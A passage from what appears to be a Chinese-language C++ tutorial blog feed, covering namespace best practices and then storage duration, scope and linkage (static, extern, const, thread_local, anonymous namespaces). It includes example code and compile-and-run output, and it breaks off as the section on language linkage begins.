几乎所有的现代C++库都将其组件放在一个或多个名称空间中，以防止与使用该库的代码或其他库发生冲突。<code>std</code> 是最典型的例子。</li><li>  <strong>项目组织:</strong> 在大型项目中，开发者经常使用名称空间来划分代码的不同模块或功能区域。</li><li>  <strong>避免全局污染:</strong> 使用名称空间可以减少全局作用域中的名称数量，使代码更清晰、更易于维护。</li></ul><p><strong>最佳实践:</strong></p><ol><li> **优先使用作用域解析运算符 (<code>::</code>)**：这是最明确、最不易出错的方式。</li><li> <strong>在 <code>.cpp</code> 文件或函数内部使用 <code>using</code> 声明或指令</strong>：避免在头文件（<code>.h</code> 或 <code>.hpp</code>）的顶层使用 <code>using</code> 指令，因为它会影响所有包含该头文件的文件，可能导致意想不到的名称冲突。</li><li> <strong>将自己的代码放入名称空间</strong>：这是一个良好的编程习惯，特别是当你编写可能被他人重用的代码时。</li></ol><p>理解和正确使用名称空间对于编写健壮、可维护的C++代码至关重要。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.2 存储持续性、作用域和链接性</title>
      <link href="2025/04/26/9.2_%E5%AD%98%E5%82%A8%E6%8C%81%E7%BB%AD%E6%80%A7%E3%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%93%BE%E6%8E%A5%E6%80%A7/"/>
      <url>2025/04/26/9.2_%E5%AD%98%E5%82%A8%E6%8C%81%E7%BB%AD%E6%80%A7%E3%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%93%BE%E6%8E%A5%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>C++ 使用多种方案来管理内存中的数据。了解这些方案对于理解变量和函数的生命周期、可见性以及它们如何在不同文件间共享至关重要。主要涉及三个核心概念：</p><ol><li> <strong>存储持续性 (Storage Duration):</strong> 决定了对象（变量）在内存中保留多长时间。</li><li> <strong>作用域 (Scope):</strong> 描述了标识符（变量名、函数名等）在程序代码中的可见范围。</li><li> <strong>链接性 (Linkage):</strong> 决定了在不同编译单元（<code>.cpp</code> 文件）中声明的同名标识符是否指向同一个实体。</li></ol><p>C++ 主要有以下几种存储持续性：</p><ul><li>  <strong>自动存储持续性 (Automatic Storage Duration):</strong> 对象在程序执行进入其定义所在的代码块时创建，在退出该代码块时销毁。通常在函数内部定义的变量（非 <code>static</code>）属于这种。内存通常在栈 (stack) 上分配。</li><li>  <strong>静态存储持续性 (Static Storage Duration):</strong> 对象在程序启动时创建（或首次使用前），在整个程序运行期间都存在，直到程序结束时才销毁。全局变量、文件作用域的 <code>static</code> 变量、函数内部的 <code>static</code> 变量都属于这种。</li><li>  <strong>线程存储持续性 (Thread Storage Duration) (C++11):</strong> 对象与特定线程的生命周期绑定。使用 <code>thread_local</code> 说明符声明。</li><li>  <strong>动态存储持续性 (Dynamic Storage Duration):</strong> 对象通过 <code>new</code> 运算符在程序的自由存储区（堆, heap）上显式创建，并通过 <code>delete</code> 运算符显式销毁。其生命周期由程序员控制。</li></ul><h2 id="9-2-1-作用域和链接"><a href="#9-2-1-作用域和链接" class="headerlink" title="9.2.1 作用域和链接"></a>9.2.1 作用域和链接</h2><p><strong>作用域 (Scope)</strong> 定义了标识符有效的代码区域。C++ 中的主要作用域包括：</p><ul><li>  <strong>块作用域 (Block Scope):</strong> 标识符在代码块（由 <code>&#123;&#125;</code> 包围）内可见，从声明点开始到代码块结束。函数内部的变量、循环变量等具有块作用域。</li><li>  <strong>函数作用域 (Function Scope):</strong> 仅用于 <code>goto</code> 语句的标签，标签在整个函数内部都可见。</li><li>  <strong>函数原型作用域 (Function Prototype Scope):</strong> 函数原型参数列表中的标识符仅在原型声明内部可见。</li><li>  <strong>文件作用域 (File Scope) / 全局作用域 (Global Scope) / 名称空间作用域 (Namespace Scope):</strong> 在所有函数或类外部定义的标识符具有文件作用域（或更准确地说是名称空间作用域，全局作用域是默认的全局名称空间）。它们从声明点开始到文件末尾都可见。</li><li>  <strong>类作用域 (Class Scope):</strong> 类成员（数据成员和成员函数）具有类作用域，在类定义内部以及通过对象、引用或指针访问时可见。</li></ul><p><strong>链接性 (Linkage)</strong> 描述了名称如何在不同的编译单元（<code>.cpp</code> 文件）之间共享。</p><ul><li>  <strong>无链接性 (No Linkage):</strong> 名称只在定义它的作用域内有效，不能被其他作用域或编译单元访问。具有块作用域的变量（包括函数内部的 <code>static</code> 变量）通常没有链接性。</li><li>  <strong>内部链接性 (Internal Linkage):</strong> 名称可以在定义它的<strong>单个编译单元</strong>内的所有作用域中共享，但不能被其他编译单元访问。在文件作用域（全局或命名空间）使用 <code>static</code> 关键字声明的变量和函数，以及匿名命名空间中的实体具有内部链接性。</li><li>  <strong>外部链接性 (External Linkage):</strong> 名称可以在<strong>多个编译单元</strong>之间共享。在文件作用域（全局或命名空间）声明的非 <code>static</code> 函数、非 <code>static</code> 非 <code>const</code> 全局变量、<code>extern const</code> 全局变量以及类等具有外部链接性。</li></ul><h2 id="9-2-2-自动存储持续性"><a href="#9-2-2-自动存储持续性" class="headerlink" title="9.2.2 自动存储持续性"></a>9.2.2 自动存储持续性</h2><p>这是最常见的存储方式，适用于函数内部定义的局部变量（未使用 <code>static</code>、<code>extern</code> 或 <code>thread_local</code>）。</p><ul><li>  <strong>存储持续性:</strong> 自动。进入代码块时创建，退出时销毁。</li><li>  <strong>作用域:</strong> 块作用域。</li><li>  <strong>链接性:</strong> 无链接性。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> auto_var = <span class="number">10</span>; <span class="comment">// 自动变量</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside my_func: auto_var = &quot;</span> &lt;&lt; auto_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    auto_var++; <span class="comment">// 修改只在本次调用有效</span></span><br><span class="line">&#125; <span class="comment">// auto_var 在这里被销毁</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> main_var = <span class="number">5</span>; <span class="comment">// main 函数的自动变量</span></span><br><span class="line">    <span class="keyword">if</span> (main_var &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">double</span> block_var = <span class="number">3.14</span>; <span class="comment">// 块作用域的自动变量</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside if block: block_var = &quot;</span> &lt;&lt; block_var &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="comment">// block_var 在这里被销毁</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; block_var; // 错误！block_var 在此作用域不可见</span></span><br><span class="line"></span><br><span class="line">    my_func(); <span class="comment">// 调用 my_func，创建并销毁其 auto_var</span></span><br><span class="line">    my_func(); <span class="comment">// 再次调用，创建新的 auto_var，其值仍是 10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-2-3-静态持续变量"><a href="#9-2-3-静态持续变量" class="headerlink" title="9.2.3 静态持续变量"></a>9.2.3 静态持续变量</h2><p>静态持续变量在程序整个运行期间都存在。根据链接性不同，它们有不同的用途和可见性。</p><h2 id="9-2-4-静态持续性、外部链接性"><a href="#9-2-4-静态持续性、外部链接性" class="headerlink" title="9.2.4 静态持续性、外部链接性"></a>9.2.4 静态持续性、外部链接性</h2><p>这些变量（有时称为全局变量）可以在程序的多个文件中共享。</p><ul><li>  <strong>定义:</strong> 在所有函数外部定义，且未使用 <code>static</code> 关键字。</li><li>  <strong>存储持续性:</strong> 静态。</li><li>  <strong>作用域:</strong> 文件作用域（从定义点到文件尾）。</li><li>  <strong>链接性:</strong> 外部链接性。</li><li>  <strong>初始化:</strong> 如果未显式初始化，会被自动初始化为零（或对应类型的零值）。</li><li>  <strong>共享:</strong> 要在其他文件中使用，需要使用 <code>extern</code> 关键字进行<strong>声明</strong>（不是定义）。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file1.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义具有外部链接性的全局变量</span></span><br><span class="line"><span class="keyword">double</span> global_data = <span class="number">3.14</span>; <span class="comment">// 显式初始化</span></span><br><span class="line"><span class="keyword">int</span> count; <span class="comment">// 隐式初始化为 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_data</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In file1: global_data = &quot;</span> &lt;&lt; global_data &lt;&lt; <span class="string">&quot;, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 file1 中定义的全局变量 (使用 extern)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">double</span> global_data;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 file1 中定义的函数 (函数声明默认 extern)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">increment_count</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_data</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">use_globals</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In file2 (before increment): global_data = &quot;</span> &lt;&lt; global_data &lt;&lt; <span class="string">&quot;, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    increment_count(); <span class="comment">// 调用 file1 中的函数，修改 file1 中的 count</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In file2 (after increment): global_data = &quot;</span> &lt;&lt; global_data &lt;&lt; <span class="string">&quot;, count = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    display_data(); <span class="comment">// 调用 file1 的函数</span></span><br><span class="line">    use_globals();  <span class="comment">// 调用 file2 的函数</span></span><br><span class="line">    display_data(); <span class="comment">// 再次调用 file1 的函数，查看 count 的变化</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和链接:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ file1.cpp file2.cpp -o myprogram</span><br><span class="line">./myprogram</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In file1: global_data &#x3D; 3.14, count &#x3D; 0</span><br><span class="line">In file2 (before increment): global_data &#x3D; 3.14, count &#x3D; 0</span><br><span class="line">In file2 (after increment): global_data &#x3D; 3.14, count &#x3D; 1</span><br><span class="line">In file1: global_data &#x3D; 3.14, count &#x3D; 1</span><br></pre></td></tr></table></figure><p><strong>注意:</strong> 过度使用具有外部链接性的全局变量会增加模块间的耦合度，使程序难以理解和维护，应尽量避免。</p><h2 id="9-2-5-静态持续性、内部链接性"><a href="#9-2-5-静态持续性、内部链接性" class="headerlink" title="9.2.5 静态持续性、内部链接性"></a>9.2.5 静态持续性、内部链接性</h2><p>这些变量和函数的作用域限制在单个编译单元（<code>.cpp</code> 文件）内，有助于避免不同文件间的命名冲突。</p><ul><li>  <strong>定义:</strong> 在所有函数外部定义，并使用 <code>static</code> 关键字。或者定义在匿名命名空间中。</li><li>  <strong>存储持续性:</strong> 静态。</li><li>  <strong>作用域:</strong> 文件作用域。</li><li>  <strong>链接性:</strong> 内部链接性。</li><li>  <strong>初始化:</strong> 同外部链接性变量，默认为零值。</li><li>  <strong>共享:</strong> 不能被其他编译单元通过 <code>extern</code> 访问。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// service.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 具有内部链接性的静态全局变量</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> service_counter = <span class="number">0</span>; <span class="comment">// 只在 service.cpp 可见</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 具有内部链接性的静态函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">internal_helper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Internal helper called.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">provide_service</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    internal_helper();</span><br><span class="line">    service_counter++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Service provided. Counter: &quot;</span> &lt;&lt; service_counter &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明 service.cpp 中的函数 (具有外部链接性)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">provide_service</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// extern int service_counter; // 错误！无法访问内部链接性的变量</span></span><br><span class="line"><span class="comment">// static void internal_helper(); // 错误！无法访问内部链接性的函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    provide_service();</span><br><span class="line">    provide_service();</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; service_counter; // 错误！</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和链接:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ service.cpp main.cpp -o myapp</span><br><span class="line">./myapp</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Internal helper called.</span><br><span class="line">Service provided. Counter: 1</span><br><span class="line">Internal helper called.</span><br><span class="line">Service provided. Counter: 2</span><br></pre></td></tr></table></figure><p><strong>匿名命名空间 (Unnamed/Anonymous Namespace):</strong></p><p>C++ 提供匿名命名空间作为 <code>static</code> 用于内部链接性的更好替代方案。在匿名命名空间中声明的所有内容都具有内部链接性。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// service_v2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">// 匿名命名空间</span></span><br><span class="line">    <span class="keyword">int</span> service_counter_v2 = <span class="number">0</span>; <span class="comment">// 内部链接性</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">internal_helper_v2</span><span class="params">()</span> </span>&#123; <span class="comment">// 内部链接性</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Internal helper v2 called.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// end anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">provide_service_v2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    internal_helper_v2();</span><br><span class="line">    service_counter_v2++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Service v2 provided. Counter: &quot;</span> &lt;&lt; service_counter_v2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-2-6-静态存储持续性、无链接性"><a href="#9-2-6-静态存储持续性、无链接性" class="headerlink" title="9.2.6 静态存储持续性、无链接性"></a>9.2.6 静态存储持续性、无链接性</h2><p>这种变量在函数内部声明，但使用 <code>static</code> 关键字。</p><ul><li>  <strong>定义:</strong> 在代码块（通常是函数）内部，使用 <code>static</code> 关键字。</li><li>  <strong>存储持续性:</strong> 静态。它们在程序启动时或第一次执行到其定义时创建，并在整个程序生命周期内存在。</li><li>  <strong>作用域:</strong> 块作用域。它们只能在定义它们的代码块内部按名称访问。</li><li>  <strong>链接性:</strong> 无链接性。</li><li>  <strong>初始化:</strong> 只在程序执行第一次到达其定义时初始化一次。如果未显式初始化，默认为零值。</li><li>  <strong>特性:</strong> 它们在函数调用之间保持其值。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">record_call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> call_count = <span class="number">0</span>; <span class="comment">// 静态局部变量，只初始化一次</span></span><br><span class="line">    call_count++;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Function record_call has been called &quot;</span> &lt;&lt; call_count &lt;&lt; <span class="string">&quot; times.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    record_call();</span><br><span class="line">    record_call();</span><br><span class="line">    record_call();</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; call_count; // 错误！call_count 在 main 中不可见</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Function record_call has been called 1 times.</span><br><span class="line">Function record_call has been called 2 times.</span><br><span class="line">Function record_call has been called 3 times.</span><br></pre></td></tr></table></figure><h2 id="9-2-7-说明符和限定符"><a href="#9-2-7-说明符和限定符" class="headerlink" title="9.2.7 说明符和限定符"></a>9.2.7 说明符和限定符</h2><p>C++ 提供了一些关键字来修改变量或函数的存储持续性、链接性或行为：</p><ul><li><strong><code>static</code></strong>:<ul><li>  用于文件作用域：指定<strong>内部链接性</strong>。</li><li>  用于块作用域：指定<strong>静态存储持续性</strong>（和无链接性）。</li><li>  用于类成员：表示成员属于类本身，而不是类的特定对象（将在类章节详细介绍）。</li></ul></li><li><strong><code>extern</code></strong>:<ul><li>  用于变量：声明一个在别处（通常是另一个文件）定义的具有<strong>外部链接性</strong>的变量。它不创建变量，只是告诉编译器该变量存在。</li><li>  <code>extern &quot;C&quot;</code>: 指定<strong>语言链接性</strong>（见 9.2.9）。</li></ul></li><li><strong><code>const</code></strong>:<ul><li>  限定符，表示变量的值不能被修改。</li><li><code>const</code> 全局变量默认具有<strong>内部链接性</strong>。要使其具有外部链接性，必须使用 <code>extern const</code> 声明，并在定义时也加上 <code>extern</code>。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// header.h</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">int</span> MAX_USERS; <span class="comment">// 声明外部链接的 const</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// config.cpp</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">int</span> MAX_USERS = <span class="number">100</span>; <span class="comment">// 定义外部链接的 const</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// utils.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;header.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_users</span><span class="params">()</span> </span>&#123; <span class="keyword">if</span> (user_count &gt; MAX_USERS) &#123; <span class="comment">/*...*/</span> &#125; &#125;</span><br></pre></td></tr></table></figure>  或者，更常见的做法是将 <code>const</code> 定义在头文件中（因为它默认内部链接，不会引起重定义问题），或者使用 C++11 的 <code>constexpr</code>。</li></ul></li><li><strong><code>thread_local</code> (C++11)</strong>:<ul><li>  指定<strong>线程存储持续性</strong>。每个线程将拥有该变量的独立副本。</li></ul></li><li><strong><code>volatile</code></strong>:<ul><li>  限定符，告诉编译器变量的值可能在程序代码未显式修改的情况下发生改变（例如，由硬件或其他并发线程修改）。编译器不会对 <code>volatile</code> 变量进行某些优化（如缓存到寄存器）。</li></ul></li><li><strong><code>mutable</code></strong>:<ul><li>  限定符，仅用于类的数据成员。允许在 <code>const</code> 成员函数中修改被 <code>mutable</code> 修饰的成员变量。</li></ul></li></ul><h2 id="9-2-8-函数和链接性"><a href="#9-2-8-函数和链接性" class="headerlink" title="9.2.8 函数和链接性"></a>9.2.8 函数和链接性</h2><p>函数默认具有<strong>外部链接性</strong>，这意味着在一个文件中定义的函数可以在其他文件中声明和调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// math_utils.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">square</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123; <span class="keyword">return</span> x * x; &#125; <span class="comment">// 外部链接性 (默认)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">square</span><span class="params">(<span class="keyword">double</span> x)</span></span>; <span class="comment">// 声明 (默认 extern)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; square(<span class="number">5.0</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>可以使用 <code>static</code> 关键字将函数的链接性改为<strong>内部链接性</strong>，使其仅在定义的 <code>.cpp</code> 文件内可见。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// helper.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">internal_print</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="comment">// 内部链接性</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Internal] &quot;</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">public_helper</span><span class="params">()</span> </span>&#123; internal_print(<span class="string">&quot;Public helper called&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">public_helper</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// static void internal_print(const char*); // 错误！无法访问</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; public_helper(); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><h2 id="9-2-9-语言链接性"><a href="#9-2-9-语言链接性" class="headerlink" title="9.2.9 语言链接性"></a>9.2.9 语言链接性</h2><p>C++ 